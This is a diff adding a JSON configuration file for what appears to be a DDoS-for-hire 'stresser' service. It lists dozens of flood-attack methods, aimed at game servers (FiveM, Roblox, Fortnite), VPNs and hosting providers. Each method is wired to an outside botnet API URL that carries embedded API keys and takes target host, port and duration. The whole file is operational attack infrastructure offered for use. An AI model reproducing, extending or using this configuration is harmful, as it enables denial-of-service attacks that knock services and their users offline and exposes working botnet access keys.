@@ -1,0 +1,646 @@
+[
+	{
+		"name": "ark-lift",
+		"description": "tcp flood attack",
+
+		"method": "ARK-LIFT",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ark-ps4",
+		"description": "hex flood",
+
+		"method": "ARK-PS4",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": false,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "wra",
+		"description": "tcp flood attack",
+
+		"method": "WRA",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "choopa",
+		"description": "tcp flood attack",
+
+		"method": "CHOOPA",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "r6-ranked",
+		"description": "kilall flood attack",
+
+		"method": "R6RANK",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "rail",
+		"description": "killall flood attack",
+
+		"method": "LDAP",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "tcp-bypass",
+		"description": "killall flood attack",
+
+		"method": "TCP-BYPASS",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ipsec",
+		"description": "killall flood attack",
+
+		"method": "IPSEC-BYPASS",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "esp",
+		"description": "killall flood attack",
+
+		"method": "ESP",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "hex",
+		"description": "killall flood attack",
+
+		"method": "HEX",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "fn-lag",
+		"description": "killall flood attack",
+
+		"method": "FORTNITE",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "hydra-down",
+		"description": "killall flood attack",
+
+		"method": "HYRDA-RAPE",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "udpbypass",
+		"description": "killall flood attack",
+
+		"method": "UDP-BYPASS",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "httpbypass",
+		"description": "killall flood attack",
+
+		"method": "HTTPBYPASS",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 443,
+		"vip": false
+	},
+	{
+		"name": "openvpn",
+		"description": "killall flood attack",
+
+		"method": "OPENVPN-KILL",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "zoom",
+		"description": "killall flood attack",
+
+		"method": "ZOOM",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "icmpdown",
+		"description": "killall flood attack",
+
+		"method": "ICMP",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "r-flag",
+		"description": "killall flood attack",
+
+		"method": "RFLAG",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ldap",
+		"description": "killall flood attack",
+
+		"method": "LDAP",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ntp",
+		"description": "killall flood attack",
+
+		"method": "NTP",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ark-255",
+		"description": "killall flood attack",
+
+		"method": "ARK-DEDI",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "fivem-game",
+		"description": "killall flood attack",
+
+		"method": "FIVEM-REQ",
+		"remote": {
+			"target": "http://51.38.109.58/NETWORK2.php?host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "roblox",
+		"description": "killall flood attack",
+
+		"method": "ROBLOX",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "fivem-down",
+		"description": "killall flood attack",
+
+		"method": "FIVEM",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ovh-icmp",
+		"description": "killall flood attack",
+
+		"method": "OVH-ICMP",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "100up-kill",
+		"description": "killall flood attack",
+
+		"method": "100UP-KILL",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "amongus",
+		"description": "killall flood attack",
+
+		"method": "AMONGUS",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "triangle",
+		"description": "killall flood attack",
+
+		"method": "TRIANGLE",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "js-bypass",
+		"description": "killall flood attack",
+
+		"method": "AUTOBYPASS",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 443,
+		"vip": false
+	},
+	{
+		"name": "2k",
+		"description": "killall flood attack",
+
+		"method": "2K",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "cod",
+		"description": "killall flood attack",
+
+		"method": "COD",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "rust",
+		"description": "killall flood attack",
+
+		"method": "RUST",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "nfo-tcp",
+		"description": "killall flood attack",
+
+		"method": "NFO-STEALTH",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "k.o",
+		"description": "killall flood attack",
+
+		"method": "K.O",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "nfo-slap",
+		"description": "killall flood attack",
+
+		"method": "NFO-SLAP",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ovhudp",
+		"description": "killall flood attack",
+
+		"method": "OVHUDP",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "NFOUDP",
+		"description": "killall flood attack",
+
+		"method": "NFOUDP",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "hydra-kill",
+		"description": "killall flood attack",
+
+		"method": "HYRDA-RAPE",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ovh-amp",
+		"description": "killall flood attack",
+
+		"method": "OVH-AMP",
+		"remote": {
+			"target": "https://blazeapi.xyz/api/botnet?key=bassingsblazeajnskgd&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "hydra",
+		"description": "killall flood attack",
+
+		"method": "HYDRA",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 443,
+		"vip": false
+	},
+	{
+		"name": "httpget",
+		"description": "killall flood attack",
+
+		"method": "HTTPGET",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "ovh-game",
+		"description": "killall flood attack",
+
+		"method": "OVHGAME",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "teams",
+		"description": "killall flood attack",
+
+		"method": "TEAMS",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "stomp",
+		"description": "killall flood attack",
+
+		"method": "STOMP",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "syn-x",
+		"description": "killall flood attack",
+
+		"method": "SYN69",
+		"remote": {
+			"target": "https://relevantapi.xyz/stresser/api/api.php?key=6xvFkhyxcatUIyYR&host=<<$target>>&port=<<$port>>&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	},
+	{
+		"name": "home",
+		"description": "killall flood attack",
+
+		"method": "ldap",
+		"remote": {
+			"target": "http://hellservicesapi.com/api/botnet?key=SUPERIOR&host=<<$target>>&port=<<$port>>t&time=<<$time>>&method=<<$method>>",
+			"urlEncode": true,
+			"pathEncode": true
+		},
+
+		"defaultPort": 0,
+		"vip": false
+	}
+]
